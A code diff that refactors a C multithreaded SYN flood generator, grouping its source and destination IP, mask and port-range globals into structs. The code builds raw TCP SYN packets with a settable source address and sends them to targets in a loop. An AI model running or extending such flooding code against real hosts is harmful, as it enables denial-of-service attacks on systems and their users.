@@ -11,17 +11,10 @@ extern int g_num_threads;
 __u64 g_syn_num_total;
 __u64 g_syn_num_generated_in_sec;
 // from main()
-unsigned char g_syn_dest_ip[16];
-unsigned char g_syn_src_ip[16];
-__u32 g_syn_src_mask;
-__u32 g_syn_dest_mask;
-__u32 g_syn_dest_port_start;
-__u32 g_syn_dest_port_end;
+InputArguments g_syn_input;
 __u32 g_syn_request_per_sec;
 // for masking next ip address
-unsigned char g_syn_now_src_ip[16];
-unsigned char g_syn_now_dest_ip[16];
-__u32 g_syn_now_dest_port;
+MaskingArguments g_syn_now;
 // thread
 pthread_mutex_t g_syn_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t g_syn_cond = PTHREAD_COND_INITIALIZER;
@@ -46,29 +39,20 @@ void *generate_syn_flood(void *data)
 		// *** begin of critical section ***
 		pthread_mutex_lock(&g_syn_mutex);
 		// get now resource
-		generator(
-				g_syn_src_ip,
-				g_syn_dest_ip,
-				g_syn_src_mask,
-				g_syn_dest_mask,
-				g_syn_dest_port_start,
-				g_syn_dest_port_end,
-				g_syn_now_src_ip,
-				g_syn_now_dest_ip,
-				&g_syn_now_dest_port);
+		get_masking_arguments(&g_syn_input, &g_syn_now);
 		// make ipv4 header
 		struct iphdr ipv4_h;
 		ipv4_h = prepare_empty_ipv4();
 		ipv4_h = ipv4_set_protocol(ipv4_h, IPPROTO_TCP);
-		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_syn_src_ip));
-		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_syn_dest_ip));
+		ipv4_h = ipv4_set_saddr(ipv4_h, inet_addr(g_syn_input.src));
+		ipv4_h = ipv4_set_daddr(ipv4_h, inet_addr(g_syn_input.dest));
 		ipv4_h = ipv4_add_size(ipv4_h, sizeof(struct tcphdr));
 		// make tcp header.
 		struct tcphdr tcp_h;
 		tcp_h = prepare_empty_tcp();
 		// set src port number random
 		tcp_h = tcp_set_src_port(tcp_h, rand() % 65535 + 1);
-		tcp_h = tcp_set_dest_port(tcp_h, g_syn_now_dest_port);
+		tcp_h = tcp_set_dest_port(tcp_h, g_syn_now.port);
 		tcp_h = tcp_set_seq(tcp_h, g_syn_num_total);
 		// ***For SYN TCP request, ACK seq should not be provided
 		// tcp_h = tcp_set_ack_seq(tcp_h,35623);
@@ -86,7 +70,7 @@ void *generate_syn_flood(void *data)
 				&g_syn_num_generated_in_sec);
 		// make and send packet
 		char *packet = packet_assemble(ipv4_h, &tcp_h, sizeof(tcp_h));
-		send_packet(sock, ipv4_h, packet, g_syn_now_dest_port);
+		send_packet(sock, ipv4_h, packet, g_syn_now.port);
 		free(packet);
 		g_syn_num_generated_in_sec++;
 		g_syn_num_total++;
@@ -122,14 +106,7 @@ void syn_flood_main(char *argv[])
 		return;
 	}
 	// get ip address, mask, port
-	split_ip_mask_port(
-			argv,
-			g_syn_src_ip,
-			g_syn_dest_ip,
-			&g_syn_src_mask,
-			&g_syn_dest_mask,
-			&g_syn_dest_port_start,
-			&g_syn_dest_port_end);
+	argv_to_input_arguments(argv, &g_syn_input);
 	g_syn_num_generated_in_sec = 0;
 	g_syn_num_total = 0;
 	memset(&g_syn_before_time, 0, sizeof(struct timespec));
@@ -142,7 +119,7 @@ void syn_flood_main(char *argv[])
 		thread_ids[i] = i;
 	}
 	printf("Sending SYN requests to %s using %d threads\n",
-			g_syn_dest_ip, num_threads);
+			g_syn_input.dest, num_threads);
 	int i;
 	for (i = 0; i < num_threads; i++) {
 		pthread_create(
